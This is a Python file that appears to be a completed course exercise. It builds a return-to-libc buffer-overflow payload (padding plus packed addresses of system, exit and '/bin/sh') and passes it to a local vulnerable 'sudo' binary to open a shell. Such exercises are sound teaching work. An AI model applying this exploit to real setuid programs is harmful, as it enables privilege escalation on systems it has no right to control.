import os
import sys
import base64
import addresses
import struct 

PATH_TO_SUDO = './sudo'
EXIT_CODE = 0x42


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to open a shell using the return-to-libc
    technique and exit with our new exit code. Make sure to return a `bytes` object
    and not an `str` object.

    NOTES:
    1. Use `addresses.SYSTEM` to get the address of the `system` function
    2. Use `addresses.LIBC_BIN_SH` to get the address of the "/bin/sh" string
    3. Use `addresses.EXIT` to get the address of the `exit` function

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    # this will be used for padding- making sure that our rop will be exectly instead of the return address
    padding = 135* b'a'
    return padding + struct.pack('<IIIB', addresses.SYSTEM, addresses.EXIT, addresses.LIBC_BIN_SH, 0x42) 


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
